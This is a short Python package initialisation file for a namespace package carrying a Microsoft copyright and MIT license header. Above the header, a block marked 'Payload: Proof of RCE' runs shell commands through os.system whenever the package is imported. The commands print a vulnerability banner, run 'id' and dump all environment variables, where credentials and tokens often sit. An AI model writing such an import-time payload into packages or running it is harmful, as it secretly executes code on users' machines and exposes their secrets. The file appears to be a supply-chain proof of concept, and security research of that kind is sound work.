import os
# Payload: Proof of RCE
os.system("echo ' [!] CRITICAL VULNERABILITY: RCE CONFIRMED [!] '; id; env")
# --------------------------------------------------------------------------------------------
# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See License.txt in the project root for license information.
# --------------------------------------------------------------------------------------------
__path__ = __import__("pkgutil").extend_path(__path__, __name__)
